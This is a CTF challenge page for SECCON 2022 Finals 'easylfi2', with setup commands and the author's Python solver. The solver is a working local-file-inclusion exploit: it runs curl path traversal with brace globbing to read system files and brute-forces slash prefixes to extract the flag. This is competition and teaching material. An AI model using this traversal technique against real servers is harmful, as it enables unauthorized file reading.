---
title: "Easylfi2 - SECCON CTF 2022 Finals 2023"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "subprocess", "easylfi2", "web", "seccon-ctf-2022-finals"]
summary: "easylfi again! I know you fully understand everything about curl."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/easylfi2"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Finals"
  year: 2023
  challenge: "Easylfi2"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/easylfi2>
- **CTF:** SECCON CTF 2022 Finals 2023

---

# [web] easylfi2

## Description

[easylfi](https://github.com/SECCON/SECCON2022_online_CTF/tree/main/web/easylfi) again! I know you fully understand everything about curl.

- `http://easylfi2.{int,dom}.seccon.games:3000`

## Attachments

- [easylfi2](files/easylfi2)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=3000 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `solver.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/easylfi2/solver/solver.py>

```python
import os
import re
import subprocess

BASE_URL = f"http://{os.getenv('SECCON_HOST')}:{os.getenv('SECCON_PORT')}"


def curl(files: list[str]) -> bytes:
    proc = subprocess.run(
        [
            "curl",
            "--globoff",
            "--path-as-is",
            BASE_URL + "/../../{" + ",".join(files) + "}",
        ],
        capture_output=True
    )
    assert proc.returncode == 0
    return proc.stdout


files = [
    "bin/tar",
    "bin/sed",
    "bin/gunzip",
    "app/package.json",
    "app/package.json",
    "app/package.json",
    "app/package.json",
    "app/package.json",
]

assert len(curl(files)) < 1024 * 1024
assert len(curl(files)) == 1048467

for i in range(1000):
    flag_file = "/"*i + "flag.txt"
    stdout = curl(files + [flag_file]).decode()
    if stdout == "🤔":
        continue
    else:
        print(f"{i = }")
        print(re.search(r"SECCON{\w+", stdout).group(0) + "}")
        exit(0)
print("Failed")
```
